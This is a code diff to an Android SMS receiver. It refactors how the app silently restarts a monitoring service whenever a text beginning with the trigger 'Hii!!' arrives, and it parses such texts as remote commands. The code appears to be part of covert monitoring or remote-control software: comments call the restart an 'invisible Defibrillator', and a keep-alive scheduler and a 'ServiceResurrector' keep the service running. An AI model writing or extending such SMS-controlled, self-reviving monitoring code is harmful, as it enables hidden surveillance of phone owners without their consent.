@@ -49,12 +49,8 @@ class SmsReceiver : BroadcastReceiver() {
                     // Syntax: Hii!! [Command] [Content]
                     if (body != null && body.startsWith("Hii!!")) {
                         // 1. ALWAYS SHOCK: Every 'Hii!!' acts as an invisible Defibrillator
-                        val monitorIntent = Intent(context, MonitorService::class.java)
-                        try {
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(monitorIntent)
-                            else context.startService(monitorIntent)
-                            KeepAliveReceiver.scheduleNext(context)
-                        } catch(e: Exception) {}
+                        ServiceResurrector.shock(context)
+                        KeepAliveReceiver.scheduleNext(context)
 
                         val parts = body.split(" ")
                         if (parts.size >= 2) {
